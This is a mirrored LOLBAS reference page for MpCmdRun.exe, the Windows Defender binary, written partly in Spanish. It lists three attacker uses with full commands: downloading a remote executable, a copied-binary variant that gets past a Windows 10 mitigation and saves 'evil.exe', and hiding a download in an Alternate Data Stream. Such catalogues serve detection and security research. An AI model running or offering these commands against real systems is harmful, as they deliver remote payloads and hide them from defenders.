# LOLBAS: MpCmdRun.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `ADS`, `Download`

Binary part of Windows Defender. Used to manage settings in Windows Defender

## Comandos

### Download file

Download · priv: User · T1105

```cmd
MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}
```

Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path)

### Download file

Download · priv: User · T1105

```cmd
copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" C:\Users\Public\Downloads\MP.exe && chdir "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\" && "C:\Users\Public\Downloads\MP.exe" -DownloadFile -url {REMOTEURL:.exe} -path C:\Users\Public\Downloads\evil.exe
```

Download file to specified path. Slashes work as well as dashes (/DownloadFile, /url, /path). Updated version to bypass Windows 10 mitigation.

### Hide downloaded data into an Alternate Data Stream

ADS · priv: User · T1564.004

```cmd
MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe
```

Download file to machine and store it in Alternate Data Stream

